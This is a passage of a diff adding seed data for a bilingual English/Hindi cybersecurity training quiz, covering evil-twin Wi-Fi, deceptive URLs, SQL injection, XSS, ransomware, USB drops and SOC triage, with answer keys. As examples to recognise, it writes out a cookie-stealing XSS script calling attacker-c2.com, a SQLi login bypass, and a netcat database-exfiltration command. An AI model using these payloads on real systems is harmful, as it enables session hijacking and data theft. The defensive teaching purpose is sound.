+        "slug": "wifi-safety-mission",
+        "title_en": "Wi-Fi Safety Mission",
+        "title_hi": "वाई-फ़ाई सुरक्षा मिशन",
+        "category": "network_security",
+        "category_title_en": "Network & Web Security",
+        "category_title_hi": "नेटवर्क और वेब सुरक्षा",
+        "instructions_en": "Identify rogue access points (Evil Twin attacks), unencrypted public Wi-Fi hotspots, and captive portal manipulation.",
+        "instructions_hi": "हवाई अड्डों या कैफे में नकली वाई-फाई नेटवर्क (Evil Twin) और असुरक्षित कनेक्शन की पहचान करें।",
+        "debrief_en": "Public Wi-Fi networks can be spoofed by anyone with a portable Wi-Fi pineapple. Always enable corporate VPN and verify SSL certificates.",
+        "debrief_hi": "सार्वजनिक वाई-फाई की नकल आसानी से की जा सकती है। हमेशा कॉर्पोरेट वीपीएन का उपयोग करें।",
+        "difficulty": "beginner",
+        "timed": False,
+        "xp": 35,
+        "order_index": 12,
+        "scenarios": [
+            {
+                "type": "network",
+                "sender": "Airport Wi-Fi Scanner",
+                "subject": "Available Wireless Networks at Terminal 2",
+                "body": "Your laptop detects three open networks:\n1. 'Free_Airport_HighSpeed_Internet_No_Password'\n2. 'Starbucks_Guest_Open'\n3. 'Airport_Official_Secure' (requires 802.1x enterprise login). Which connection method is safe?",
+                "is_threat": True,
+                "explanation_en": "Open unencrypted networks are trivial to spoof with Evil Twin rogue access points. If connecting is unavoidable, a corporate VPN must be established immediately.",
+                "explanation_hi": "असुरक्षित वाई-फाई नेटवर्क हैकर्स द्वारा आसानी से क्लोन किए जा सकते हैं। केवल वीपीएन के साथ ही सुरक्षित रहा जा सकता है।",
+                "warning_signs_en": "Open, unauthenticated networks promising free high-speed access.",
+                "warning_signs_hi": "बिना पासवर्ड के मुफ्त इंटरनेट देने वाले खुले नेटवर्क।",
+                "choices": [
+                    ("Connect to 'Free_Airport_HighSpeed_Internet_No_Password' and check bank balances", False, "Attackers can intercept your plaintext traffic via Man-in-the-Middle (MitM).", "हमलावर आपके डेटा को बीच में ही चुरा सकते हैं।"),
+                    ("Use mobile hotspot or connect via encrypted enterprise network with corporate VPN active", True, "Spot on! Personal cellular tethering and VPN protect against MitM eavesdropping.", "सही! मोबाइल हॉटस्पॉट या कॉर्पोरेट वीपीएन ही सबसे सुरक्षित विकल्प है।"),
+                    ("Disable all firewall rules to speed up the public connection", False, "Leaves your operating system completely exposed to network worms.", "आपके कंप्यूटर को सीधे नेटवर्क हमलों के लिए खोल देता है।")
+                ]
+            }
+        ]
+    },
+    {
+        "slug": "url-inspector",
+        "title_en": "URL Inspector",
+        "title_hi": "यूआरएल इंस्पेक्टर",
+        "category": "network_security",
+        "category_title_en": "Network & Web Security",
+        "category_title_hi": "नेटवर्क और वेब सुरक्षा",
+        "instructions_en": "Detect IDN homograph attacks, deceptive subdomains, embedded credentials, and path obfuscation.",
+        "instructions_hi": "होलोग्राफ हमलों, भ्रामक सबडोमेन और छिपे हुए नकली वेब पतों की सूक्ष्म जांच करें।",
+        "debrief_en": "The domain is always the token immediately preceding the first single forward slash (excluding protocol). Subdomains can trick the untrained eye.",
+        "debrief_hi": "डोमेन हमेशा स्लैश से ठीक पहले वाला हिस्सा होता है। सबडोमेन अक्सर भ्रमित करने के लिए बनाए जाते हैं।",
+        "difficulty": "intermediate",
+        "timed": False,
+        "xp": 40,
+        "order_index": 13,
+        "scenarios": [
+            {
+                "type": "decision",
+                "sender": "Browser Address Bar Evaluator",
+                "subject": "Inspect the Destination Host",
+                "body": "Examine this URL carefully:\nhttps://login.microsoft.com.account-update-secops.biz/oauth/v2/authorize\nWhat is the actual domain hosting this server?",
+                "is_threat": True,
+                "explanation_en": "The actual domain is 'account-update-secops.biz'. The string 'login.microsoft.com' is merely a subdomain prefix engineered to deceive the user.",
+                "explanation_hi": "वास्तविक डोमेन 'account-update-secops.biz' है। 'login.microsoft.com' केवल एक भ्रामक सबडोमेन है।",
+                "warning_signs_en": "Reputable brand name used as a subdomain on an unrelated commercial TLD (.biz).",
+                "warning_signs_hi": "किसी प्रसिद्ध ब्रांड के नाम को सबडोमेन बनाकर नकली डोमेन में जोड़ना।",
+                "choices": [
+                    ("microsoft.com", False, "Incorrect! microsoft.com is only a subdomain prefix here.", "गलत! यहाँ microsoft.com सिर्फ एक सबडोमेन है।"),
+                    ("account-update-secops.biz", True, "Brilliant! You correctly identified the true root domain before the path slash.", "शानदार! आपने स्लैश से पहले असली रूट डोमेन को सही पहचाना।"),
+                    ("oauth/v2/authorize", False, "That is the resource path, not the host domain.", "यह रिसोर्स पाथ है, होस्ट डोमेन नहीं।")
+                ]
+            }
+        ]
+    },
+    {
+        "slug": "browser-security-quest",
+        "title_en": "Browser Security Quest",
+        "title_hi": "ब्राउज़र सुरक्षा खोज",
+        "category": "network_security",
+        "category_title_en": "Network & Web Security",
+        "category_title_hi": "नेटवर्क और वेब सुरक्षा",
+        "instructions_en": "Audit browser extensions, interpret TLS/SSL certificate invalidation warnings, and handle suspicious permission prompts.",
+        "instructions_hi": "खतरनाक ब्राउज़र एक्सटेंशन और अमान्य एसएसएल प्रमाणपत्र चेतावनियों का विश्लेषण करें।",
+        "debrief_en": "Browser extensions execute with full page reading privileges, enabling them to steal session tokens, passwords, and form inputs. Keep plugins minimal.",
+        "debrief_hi": "ब्राउज़र एक्सटेंशन आपके सभी पासवर्ड और डेटा पढ़ सकते हैं। केवल आवश्यक और सत्यापित एक्सटेंशन ही रखें।",
+        "difficulty": "beginner",
+        "timed": False,
+        "xp": 35,
+        "order_index": 14,
+        "scenarios": [
+            {
+                "type": "page",
+                "sender": "Chrome Web Store Prompt",
+                "subject": "Extension Permission Request: 'Fast Video Downloader Pro'",
+                "body": "Extension requests permissions:\n- Read and change all your data on all websites you visit\n- Read your browsing history\n- Modify data you copy and paste (clipboard access). What is the appropriate response?",
+                "is_threat": True,
+                "explanation_en": "Broad clipboard and universal website read/write access enables the extension to steal credentials, crypto wallet addresses, and personal chats.",
+                "explanation_hi": "क्लिपबोर्ड और सभी वेबसाइटों का डेटा पढ़ने की अनुमति से पासवर्ड और व्यक्तिगत जानकारी चोरी हो सकती है।",
+                "warning_signs_en": "Excessive permissions for a basic utility (clipboard access, all websites).",
+                "warning_signs_hi": "एक छोटे टूल के लिए क्लिपबोर्ड और सभी वेबसाइटों के डेटा की मांग।",
+                "choices": [
+                    ("Click 'Add Extension' because it has a 5-star graphic", False, "Fake reviews are commonly bought by malicious extension publishers.", "नकली 5-स्टार समीक्षाएं खरीदकर दुर्भावनापूर्ण एक्सटेंशन फैलाए जाते हैं।"),
+                    ("Deny and uninstall; permissions present an unacceptable data-theft hazard", True, "Spot on! Never grant universal web and clipboard access to untrusted extensions.", "सही! अज्ञात एक्सटेंशन को सभी वेबसाइटों और क्लिपबोर्ड की अनुमति न दें।"),
+                    ("Install it only on your work computer", False, "Compromises corporate proprietary assets.", "कॉर्पोरेट डेटा को खतरे में डाल देगा।")
+                ]
+            }
+        ]
+    },
+    {
+        "slug": "sql-injection-shield",
+        "title_en": "SQL Injection Shield",
+        "title_hi": "एसक्यूएल इंजेक्शन शील्ड",
+        "category": "network_security",
+        "category_title_en": "Network & Web Security",
+        "category_title_hi": "नेटवर्क और वेब सुरक्षा",
+        "instructions_en": "Identify SQL syntax tampering in login portals and understand parameterized query defenses.",
+        "instructions_hi": "लॉगिन फॉर्म में एसक्यूएल इंजेक्शन हमलों की पहचान करें और पैरामीटराइज्ड क्वेरी से बचाव सीखें।",
+        "debrief_en": "SQL Injection occurs when untrusted user input is directly concatenated into SQL statements. Always use parameterized queries or ORM frameworks.",
+        "debrief_hi": "जब उपयोगकर्ता इनपुट को सीधे एसक्यूएल में जोड़ा जाता है, तो एसक्यूएल इंजेक्शन होता है। हमेशा पैरामीटराइज्ड क्वेरी का उपयोग करें।",
+        "difficulty": "intermediate",
+        "timed": False,
+        "xp": 40,
+        "order_index": 15,
+        "scenarios": [
+            {
+                "type": "terminal",
+                "sender": "Web Application Firewall (WAF) Log",
+                "subject": "Suspicious Login Form Payload Detected",
+                "body": "POST /api/login HTTP/1.1\nHost: portal.company.com\nContent-Type: application/json\n\n{\"username\": \"admin' OR '1'='1' -- \", \"password\": \"anything\"}\nWhat is the objective of this payload?",
+                "is_threat": True,
+                "explanation_en": "This is classic SQL Injection. The input forces the query's WHERE clause to evaluate to TRUE for every row, bypassing password verification to authenticate as the first returned user (admin).",
+                "explanation_hi": "यह एक क्लासिक एसक्यूएल इंजेक्शन है जो पासवर्ड जांच को बायपास करके व्यवस्थापक के रूप में लॉगिन करने का प्रयास करता है।",
+                "warning_signs_en": "Single quote escaping, boolean tautology ('1'='1'), and SQL comment characters (--).",
+                "warning_signs_hi": "सिंगल कोट, हमेशा सत्य रहने वाली शर्त ('1'='1'), और एसक्यूएल टिप्पणी (--)।",
+                "choices": [
+                    ("Normal user attempting to recover their forgotten password", False, "This is an active database manipulation payload.", "यह एक सक्रिय डेटाबेस हेरफेर पेलोड है।"),
+                    ("SQL Injection attack attempting to bypass authentication via boolean tautology", True, "Accurate! Prepared statements neutralize this attack completely.", "बिल्कुल सही! प्रिपेयर्ड स्टेटमेंट्स इस हमले को पूरी तरह विफल कर देते हैं।"),
+                    ("A Cross-Site Scripting (XSS) payload stealing cookies", False, "Incorrect syntax; this is SQL manipulation, not client-side JavaScript.", "यह जावास्क्रिप्ट नहीं, बल्कि एसक्यूएल डेटाबेस हेरफेर है।")
+                ]
+            }
+        ]
+    },
+    {
+        "slug": "xss-defender",
+        "title_en": "XSS Defender",
+        "title_hi": "एक्सएसएस डिफेंडर",
+        "category": "network_security",
+        "category_title_en": "Network & Web Security",
+        "category_title_hi": "नेटवर्क और वेब सुरक्षा",
+        "instructions_en": "Recognize stored, reflected, and DOM-based Cross-Site Scripting (XSS) injection patterns.",
+        "instructions_hi": "वेबसाइटों पर दुर्भावनापूर्ण जावास्क्रिप्ट कोड इंजेक्शन (XSS) की पहचान करें।",
+        "debrief_en": "XSS allows attackers to execute arbitrary JavaScript in the victim's browser session, stealing session tokens. Always HTML-encode untrusted output.",
+        "debrief_hi": "एक्सएसएस से हमलावर ब्राउज़र में दुर्भावनापूर्ण स्क्रिप्ट चलाकर सत्र टोकन चुरा सकते हैं। आउटपुट को हमेशा एन्कोड करें।",
+        "difficulty": "intermediate",
+        "timed": False,
+        "xp": 40,
+        "order_index": 16,
+        "scenarios": [
+            {
+                "type": "decision",
+                "sender": "Web Security Auditor",
+                "subject": "Public Comment Forum Input Inspection",
+                "body": "A user posts this comment on your company feedback blog:\n'<script>fetch(\"https://attacker-c2.com/steal?cookie=\" + document.cookie)</script>Great article!'\nWhat will happen if this comment is rendered unescaped in other users' browsers?",
+                "is_threat": True,
+                "explanation_en": "If rendered unescaped, every user viewing the post will execute the script, transmitting their session cookies to the attacker's server.",
+                "explanation_hi": "यदि इसे बिना एन्कोडिंग के प्रदर्शित किया गया, तो टिप्पणी देखने वाले सभी उपयोगकर्ताओं के कुकीज़ हमलावर के सर्वर पर चले जाएंगे।",
+                "warning_signs_en": "Inline script tags containing document.cookie exfiltration commands.",
+                "warning_signs_hi": "डॉक्यूमेंट कुकी चुराने वाले इनलाइन स्क्रिप्ट टैग।",
+                "choices": [
+                    ("The comment will render as harmless blue bold text", False, "The script tag executes silently in the background.", "स्क्रिप्ट बैकग्राउंड में चुपचाप निष्पादित हो जाती है।"),
+                    ("Stored XSS attack: viewers' active session cookies will be exfiltrated", True, "Correct! HTML entity encoding and HttpOnly cookie flags neutralize this threat.", "सही! एचटीएमएल एन्कोडिंग और HttpOnly कुकी से यह हमला रुकता है।"),
+                    ("It will shut down the server's database immediately", False, "XSS targets the client's browser, not the backend database engine.", "एक्सएसएस क्लाइंट के ब्राउज़र को निशाना बनाता है, बैकएंड डेटाबेस को नहीं।")
+                ]
+            }
+        ]
+    },
+    {
+        "slug": "network-guardian",
+        "title_en": "Network Guardian",
+        "title_hi": "नेटवर्क गार्जियन",
+        "category": "network_security",
+        "category_title_en": "Network & Web Security",
+        "category_title_hi": "नेटवर्क और वेब सुरक्षा",
+        "instructions_en": "Analyze port scans, unauthorized lateral movements, and open management interfaces.",
+        "instructions_hi": "नेटवर्क पोर्ट स्कैनिंग, अनधिकृत संचार और खुले प्रबंधन इंटरफेस की पहचान करें।",
+        "debrief_en": "Exposing management ports like Telnet (23), SMB (445), or RDP (3389) directly to the internet invites automated credential brute-forcing.",
+        "debrief_hi": "आरडीपी या एसएमबी जैसे पोर्ट इंटरनेट पर सीधे खुले रखने से सर्वर आसानी से हैक हो जाते हैं।",
+        "difficulty": "intermediate",
+        "timed": False,
+        "xp": 40,
+        "order_index": 17,
+        "scenarios": [
+            {
+                "type": "terminal",
+                "sender": "Perimeter IDS / Firewall Alert",
+                "subject": "Inbound TCP SYN Sweep Detected",
+                "body": "Source IP: 198.51.100.42 (Unregistered foreign ASN)\nTarget IP: 203.0.113.10 (Company DMZ)\nEvent: 1,024 TCP SYN packets hitting sequential ports 1-1024 in 1.4 seconds.\nWhat is taking place?",
+                "is_threat": True,
+                "explanation_en": "This is automated network reconnaissance (a SYN port scan) mapping out open listening services for follow-up vulnerability exploitation.",
+                "explanation_hi": "यह स्वचालित पोर्ट स्कैनिंग है जो हमले के लिए खुले पोर्ट और कमजोरियों की खोज कर रही है।",
+                "warning_signs_en": "Rapid sequential port probing from an unvetted external IP.",
+                "warning_signs_hi": "अज्ञात बाहरी आईपी से बहुत तेजी से क्रमिक पोर्ट स्कैनिंग।",
+                "choices": [
+                    ("A benign customer refreshing their web browser multiple times", False, "Browsers do not connect to 1,024 sequential ports.", "ब्राउज़र कभी भी 1024 अलग-अलग पोर्ट्स पर कनेक्ट नहीं होते।"),
+                    ("Adversary port scan reconnaissance; block IP at perimeter firewall", True, "Spot on! Dropping the scanning IP at the edge firewall halts reconnaissance.", "सही! पेरिमीटर फ़ायरवॉल पर ऐसी आईपी ब्लॉक करना सही रणनीति है।"),
+                    ("Open all firewall ports to let the traffic pass freely", False, "Invites total network compromise.", "पूरे नेटवर्क को खतरे में डाल देगा।")
+                ]
+            }
+        ]
+    },
+
+    # =========================================================================
+    # CATEGORY D — MALWARE AND INCIDENT RESPONSE
+    # =========================================================================
+    {
+        "slug": "malware-hunter",
+        "title_en": "Malware Hunter",
+        "title_hi": "मैलवेयर हंटर",
+        "category": "malware_response",
+        "category_title_en": "Malware & Incident Response",
+        "category_title_hi": "मैलवेयर और घटना प्रतिक्रिया",
+        "instructions_en": "Detect dangerous email attachments, double extensions (.pdf.exe), macro-enabled spreadsheets, and hidden script payloads.",
+        "instructions_hi": "ईमेल अटैचमेंट में छिपे हुए मैलवेयर, दोहरे एक्सटेंशन और खतरनाक मैक्रोज़ की पहचान करें।",
+        "debrief_en": "Attackers disguise executables using double extensions or embed weaponized VBA macros inside documents. Never enable macros for unsolicited files.",
+        "debrief_hi": "हमलावर अक्सर दोहरे एक्सटेंशन या फाइलों में खतरनाक मैक्रोज़ छुपाते हैं। अज्ञात फाइलों में मैक्रोज़ कभी चालू न करें।",
+        "difficulty": "beginner",
+        "timed": False,
+        "xp": 35,
+        "order_index": 18,
+        "scenarios": [
+            {
+                "type": "email",
+                "sender": "Billing Clearinghouse <invoices@dispatch-settlement.com>",
+                "subject": "OVERDUE STATEMENT: Review Invoice_Oct_9918.pdf.exe",
+                "body": "Dear Partner,\n\nPlease find your final overdue statement attached: 'Invoice_Oct_9918.pdf.exe'. Unpack and double-click to view the invoice ledger immediately.",
+                "is_threat": True,
+                "explanation_en": "The file uses a double extension (.pdf.exe). Windows may hide known extensions by default, tricking users into executing an .exe trojan.",
+                "explanation_hi": "फाइल में दोहरा एक्सटेंशन (.pdf.exe) है जो देखने में पीडीएफ लगता है लेकिन वास्तव में वायरस युक्त प्रोग्राम है।",
+                "warning_signs_en": "Double file extension, executable format (.exe) disguised as an invoice.",
+                "warning_signs_hi": "डबल फाइल एक्सटेंशन, इनवॉइस के रूप में छिपा हुआ .exe प्रोग्राम।",
+                "choices": [
+                    ("Double-click to open and review the invoice", False, "Executes the malware payload with your user privileges.", "यह आपके कंप्यूटर पर सीधे मैलवेयर चला देगा।"),
+                    ("Do not open; report the email to Infosec for quarantine and blocklist", True, "Flawless! Double extensions are a classic malware deployment technique.", "उत्कृष्ट! दोहरे एक्सटेंशन वाली फाइलों को तुरंत ब्लॉक और रिपोर्ट करना चाहिए।"),
+                    ("Rename it to .docx and then open it", False, "The malicious binary code remains dangerous.", "फाइल का नाम बदलने से उसका वायरस खत्म नहीं होता।")
+                ]
+            }
+        ]
+    },
+    {
+        "slug": "ransomware-rescue",
+        "title_en": "Ransomware Rescue",
+        "title_hi": "रैनसमवेयर रेस्क्यू",
+        "category": "malware_response",
+        "category_title_en": "Malware & Incident Response",
+        "category_title_hi": "मैलवेयर और घटना प्रतिक्रिया",
+        "instructions_en": "Execute rapid containment protocols upon discovering active ransomware encryption notes and file locks.",
+        "instructions_hi": "रैनसमवेयर हमले की स्थिति में तुरंत नेटवर्क अलगाव और बैकअप रिकवरी के कदम उठाएं।",
+        "debrief_en": "The first rule of active ransomware containment is physical network disconnection (unplug ethernet, disable Wi-Fi) to prevent lateral spread to shares.",
+        "debrief_hi": "रैनसमवेयर दिखते ही सबसे पहले नेटवर्क केबल निकालें और वाई-फाई बंद करें ताकि अन्य कंप्यूटर सुरक्षित रहें।",
+        "difficulty": "intermediate",
+        "timed": True,
+        "xp": 45,
+        "order_index": 19,
+        "scenarios": [
+            {
+                "type": "decision",
+                "sender": "Workstation Screen Alert",
+                "subject": "CRITICAL: Files Renamed with .LOCKED Extension",
+                "body": "Your desktop wallpaper turns black with a note: 'ALL YOUR DATA IS ENCRYPTED. Pay 2 BTC within 48 hours.' You notice your shared departmental network drive files are starting to become unreadable. What is step #1?",
+                "is_threat": True,
+                "explanation_en": "Immediate network isolation (unplugging Ethernet cable / disconnecting Wi-Fi) halts the encryptor from encrypting shared network drives and adjacent systems.",
+                "explanation_hi": "तुरंत नेटवर्क डिस्कनेक्ट करने से रैनसमवेयर नेटवर्क के अन्य कंप्यूटरों और सर्वरों में फैलने से रुक जाता है।",
+                "warning_signs_en": "Active file renaming, ransom splash screen, network share corruption.",
+                "warning_signs_hi": "फाइलों का लॉक होना, फिरौती की मांग, नेटवर्क फाइलों का खराब होना।",
+                "choices": [
+                    ("Immediately disconnect Ethernet cable and disable Wi-Fi to stop network spread", True, "Spot on! Halting lateral movement is the top containment priority.", "बिल्कुल सही! नेटवर्क केबल निकालना और अन्य सिस्टम को बचाना पहला कर्तव्य है।"),
+                    ("Pay the 2 Bitcoin immediately with your personal credit card", False, "Never pay ransoms; it funds criminal cartels and guarantees no recovery.", "फिरौती कभी न दें; इसकी कोई गारंटी नहीं होती कि डेटा वापस मिलेगा।"),
+                    ("Restart the computer ten times hoping the files revert", False, "Rebooting can destroy volatile memory evidence and resume encryption.", "कंप्यूटर रीस्टार्ट करने से डिजिटल सबूत नष्ट हो सकते हैं।")
+                ]
+            }
+        ]
+    },
+    {
+        "slug": "usb-danger-zone",
+        "title_en": "USB Danger Zone",
+        "title_hi": "यूएसबी डेंजर ज़ोन",
+        "category": "malware_response",
+        "category_title_en": "Malware & Incident Response",
+        "category_title_hi": "मैलवेयर और घटना प्रतिक्रिया",
+        "instructions_en": "Defend against USB drop attacks, malicious HID BadUSB cables, and hardware keystroke injection.",
+        "instructions_hi": "लावारिस मिली यूएसबी ड्राइव्स और खतरनाक केबलों (BadUSB) से सिस्टम को सुरक्षित रखें।",
+        "debrief_en": "Found USB flash drives often contain malicious firmware that pretends to be a keyboard (HID), injecting terminal commands in milliseconds. Hand all found media to security.",
+        "debrief_hi": "मिली हुई यूएसबी ड्राइव में कीबोर्ड की तरह काम करने वाले वायरस हो सकते हैं। उन्हें कभी भी कंप्यूटर में न लगाएं।",
+        "difficulty": "beginner",
+        "timed": False,
+        "xp": 35,
+        "order_index": 20,
+        "scenarios": [
+            {
+                "type": "decision",
+                "sender": "Physical Security Investigation",
+                "subject": "USB Drive Discovered Near Building Entrance",
+                "body": "While walking into the corporate headquarters, you find a metallic 128GB flash drive labeled 'Q4_Executive_Salaries_Confidential.xlsx'. What should you do?",
+                "is_threat": True,
+                "explanation_en": "This is a classic USB Drop / Baiting attack. The drive likely contains a BadUSB microprocessor that mimics a keyboard and executes malicious PowerShell commands upon insertion.",
+                "explanation_hi": "यह यूएसबी ड्रॉप हमला है। इसमें छिपी हुई चिप कीबोर्ड की तरह कमांड चलाकर कंप्यूटर हैक कर सकती है।",
+                "warning_signs_en": "Tempting confidential label, unattended hardware placed in high-traffic area.",
+                "warning_signs_hi": "आकर्षक या गोपनीय लेबल, सार्वजनिक स्थान पर जानबूझकर छोड़ी गई ड्राइव।",
+                "choices": [
+                    ("Plug it into your workstation to see whose salary it is", False, "Triggers instant keystroke injection and backdoor installation.", "कंप्यूटर में लगाते ही वायरस तुरंत सक्रिय हो जाएगा।"),
+                    ("Do not insert; deliver directly to Corporate Physical Security / IT SecOps", True, "Excellent! Untrusted removable media must never touch corporate hardware.", "उत्कृष्ट! ऐसी ड्राइव को कभी न लगाएं और सीधे सुरक्षा टीम को सौंपें।"),
+                    ("Take it home to plug into your personal gaming PC instead", False, "Transfers the threat to your home network.", "आपके घर के कंप्यूटर को भी संक्रमित कर देगा।")
+                ]
+            }
+        ]
+    },
+    {
+        "slug": "incident-commander",
+        "title_en": "Incident Commander",
+        "title_hi": "इंसिडेंट कमांडर",
+        "category": "malware_response",
+        "category_title_en": "Malware & Incident Response",
+        "category_title_hi": "मैलवेयर और घटना प्रतिक्रिया",
+        "instructions_en": "Lead through the NIST Incident Response lifecycle: Preparation, Detection, Containment, Eradication, Recovery, and Lessons Learned.",
+        "instructions_hi": "सुरक्षा घटना प्रतिक्रिया के सभी चरणों (रोकथाम, उन्मूलन, पुनर्प्राप्ति) का सही क्रम सीखें।",
+        "debrief_en": "Effective incident handling follows structured phases. Eradicating malware before understanding its persistence mechanism results in immediate re-infection.",
+        "debrief_hi": "घटना का समाधान योजनाबद्ध तरीके से करें। पूरी जांच किए बिना सिस्टम शुरू करने से हमला दोबारा हो सकता है।",
+        "difficulty": "advanced",
+        "timed": False,
+        "xp": 50,
+        "order_index": 21,
+        "scenarios": [
+            {
+                "type": "decision",
+                "sender": "NIST IR Protocol Simulator",
+                "subject": "Establishing Response Order of Operations",
+                "body": "A critical database server is confirmed to have an active web shell installed by an external adversary. Put these steps in the correct order:\n1. Eradicate rootkit & patch web shell vulnerability\n2. Isolate server from internet while preserving volatile RAM\n3. Restore data from verified immutable offline backup\n4. Conduct post-incident lessons learned debrief",
+                "is_threat": True,
+                "explanation_en": "The correct sequence is Containment (2), Eradication (1), Recovery (3), and Lessons Learned (4).",
+                "explanation_hi": "सही क्रम है: पहले अलगाव (2), फिर मैलवेयर हटाना (1), बैकअप से पुनर्प्राप्ति (3), और बाद में समीक्षा (4)।",
+                "warning_signs_en": "Never recover systems before eradication, or infection will recur.",
+                "warning_signs_hi": "मैलवेयर हटाए बिना सिस्टम रीस्टोर करने से संक्रमण वापस आ जाएगा।",
+                "choices": [
+                    ("Sequence: 2 -> 1 -> 3 -> 4", True, "Perfect! Containment precedes eradication, followed by recovery and review.", "बिल्कुल सही! अलगाव, उन्मूलन, पुनर्प्राप्ति और समीक्षा का सही क्रम।"),
+                    ("Sequence: 3 -> 1 -> 2 -> 4", False, "Restoring before isolating allows the attacker to corrupt your backups.", "अलग किए बिना बैकअप रीस्टोर करने से बैकअप भी खराब हो जाएगा।"),
+                    ("Sequence: 4 -> 3 -> 2 -> 1", False, "You cannot hold a lessons learned debrief while the attack is active.", "हमले के बीच में समीक्षा बैठक नहीं की जा सकती।")
+                ]
+            }
+        ]
+    },
+    {
+        "slug": "digital-evidence-detective",
+        "title_en": "Digital Evidence Detective",
+        "title_hi": "डिजिटल एविडेंस डिटेक्टिव",
+        "category": "malware_response",
+        "category_title_en": "Malware & Incident Response",
+        "category_title_hi": "मैलवेयर और घटना प्रतिक्रिया",
+        "instructions_en": "Maintain chain of custody, perform volatile RAM capture, and document forensic evidence without altering metadata.",
+        "instructions_hi": "डिजिटल फॉरेंसिक साक्ष्य जुटाने और रैम (RAM) डेटा को सुरक्षित रखने के नियम सीखें।",
+        "debrief_en": "Rebooting a compromised system wipes volatile memory (RAM) where encryption keys and active C2 connections reside. Capture RAM before powering down.",
+        "debrief_hi": "कंप्यूटर रीस्टार्ट करने से रैम में मौजूद एनक्रिप्शन कीज़ और हैकर के कनेक्शन का सबूत मिट जाता है।",
+        "difficulty": "advanced",
+        "timed": False,
+        "xp": 50,
+        "order_index": 22,
+        "scenarios": [
+            {
+                "type": "decision",
+                "sender": "Forensics Readiness Team",
+                "subject": "Preserving Evidence on Live Compromised Host",
+                "body": "You arrive at a workstation currently running an active in-memory meterpreter shell. What is the scientifically sound forensic action?",
+                "is_threat": True,
+                "explanation_en": "Volatile evidence (RAM, running processes, active sockets) is lost forever upon power-off. A live forensic RAM image must be captured first.",
+                "explanation_hi": "कंप्यूटर बंद करने से रैम का अस्थिर डेटा हमेशा के लिए मिट जाता है। पहले लाइव रैम डंप लेना आवश्यक है।",
+                "warning_signs_en": "Order of Volatility: CPU registers/cache > RAM > Network state > Disk > Archival media.",
+                "warning_signs_hi": "अस्थिरता का क्रम: रैम और सक्रिय प्रक्रियाएं डिस्क डेटा से पहले मिटती हैं।",
+                "choices": [
+                    ("Immediately pull the power cord from the wall", False, "Destroys all volatile RAM data, encryption keys, and active network sockets.", "रैम डेटा, एनक्रिप्शन कीज़ और नेटवर्क साक्ष्य हमेशा के लिए नष्ट हो जाएंगे।"),
+                    ("Capture live RAM using dedicated forensic hardware/tool before disconnecting host", True, "Masterful! Adhering to the Order of Volatility preserves court-admissible evidence.", "उत्कृष्ट! अस्थिरता के नियम का पालन करके ही कानूनी साक्ष्य सुरक्षित रहते हैं।"),
+                    ("Open files in Notepad to see what the attacker wrote", False, "Modifies file access timestamps and taints the forensic integrity.", "फाइलें खोलने से टाइमस्टैम्प बदल जाते हैं और साक्ष्य अमान्य हो जाते हैं।")
+                ]
+            }
+        ]
+    },
+    {
+        "slug": "soc-alert-triage",
+        "title_en": "SOC Alert Triage",
+        "title_hi": "एसओसी अलर्ट ट्रायज",
+        "category": "malware_response",
+        "category_title_en": "Malware & Incident Response",
+        "category_title_hi": "मैलवेयर और घटना प्रतिक्रिया",
+        "instructions_en": "Analyze Security Operations Center (SOC) telemetry, classify true vs false positives, and assign incident severity.",
+        "instructions_hi": "एसओसी सुरक्षा चेतावनियों का विश्लेषण करें, असली हमलों और गलत अलार्म में अंतर पहचानें।",
+        "debrief_en": "SOC analysts must correlate multiple disparate logs (EDR, Firewall, Authentication) to uncover the complete attack story.",
+        "debrief_hi": "सुरक्षा विश्लेषकों को पूरे हमले को समझने के लिए फ़ायरवॉल और प्रमाणीकरण लॉग्स को मिलाकर देखना पड़ता है।",
+        "difficulty": "intermediate",
+        "timed": True,
+        "xp": 45,
+        "order_index": 23,
+        "scenarios": [
+            {
+                "type": "log",
+                "sender": "Splunk / SIEM Core Engine",
+                "subject": "Alert: Unusual Outbound Data Volume (Alert ID: #SOC-7712)",
+                "body": "Timestamp: 02:44:11 UTC\nHost: db-prod-01 (10.0.1.15)\nDestination: 185.220.101.5 (Known Tor Exit Node)\nBytes Sent: 14.8 GB via encrypted SSH (Port 2222)\nProcess: gzip -c /var/lib/postgresql/data | nc 185.220.101.5 2222\nHow do you triage this alert?",
+                "is_threat": True,
+                "explanation_en": "This is a confirmed Critical True Positive: active database exfiltration over an encrypted channel to a Tor exit node.",
+                "explanation_hi": "यह गंभीर हमला (True Positive) है: डेटाबेस को कंप्रेस करके अज्ञात टॉर नोड पर चुराया जा रहा है।",
+                "warning_signs_en": "Off-hours data transfer, netcat/gzip pipeline, Tor exit node destination.",
+                "warning_signs_hi": "असमय डेटा ट्रांसफर, अनधिकृत डेटा चोरी, टॉर नोड कनेक्शन।",
+                "choices": [
+                    ("Mark as False Positive and silence alert for 30 days", False, "Catastrophic! Your entire database has just been exfiltrated.", "घातक भूल! आपकी पूरी डेटाबेस चोरी हो रही है।"),
+                    ("Classify as P1 Critical Incident: sever outbound connection immediately and invoke incident team", True, "Flawless! High-severity data exfiltration requires instant containment.", "बिल्कुल सही! डेटा चोरी रोकने के लिए तुरंत कनेक्शन काटना आवश्यक है।"),
+                    ("Wait until Monday morning to ask the database administrator", False, "Gives attackers days of head start.", "हमलावर को पूरा डेटा चुराने का समय मिल जाएगा।")
+                ]
+            }
+        ]
+    },
+
+    # =========================================================================
+    # CATEGORY E — PRIVACY AND SECURITY OPERATIONS
+    # =========================================================================
+    {
+        "slug": "data-privacy-guardian",
+        "title_en": "Data Privacy Guardian",
+        "title_hi": "डेटा प्राइवेसी गार्जियन",
+        "category": "privacy_secops",
+        "category_title_en": "Privacy & SecOps",
+        "category_title_hi": "गोपनीयता और सुरक्षा संचालन",
+        "instructions_en": "Classify Personally Identifiable Information (PII), uphold data minimization, and enforce regulatory compliance (GDPR / DPDP).",
+        "instructions_hi": "व्यक्तिगत पहचान योग्य जानकारी (PII) का वर्गीकरण और डेटा सुरक्षा नियमों का पालन सीखें।",
+        "debrief_en": "Collect only the minimum data required for the specific business purpose. Mask or tokenize PII before sharing with third parties.",
+        "debrief_hi": "केवल उतना ही डेटा एकत्र करें जितना आवश्यक हो। तीसरे पक्ष के साथ साझा करने से पहले व्यक्तिगत डेटा को छुपाएं।",
+        "difficulty": "beginner",
+        "timed": False,
+        "xp": 35,
+        "order_index": 24,
+        "scenarios": [
+            {
+                "type": "decision",
+                "sender": "Compliance & Privacy Review",
+                "subject": "Sharing Production Database with External Marketing Agency",
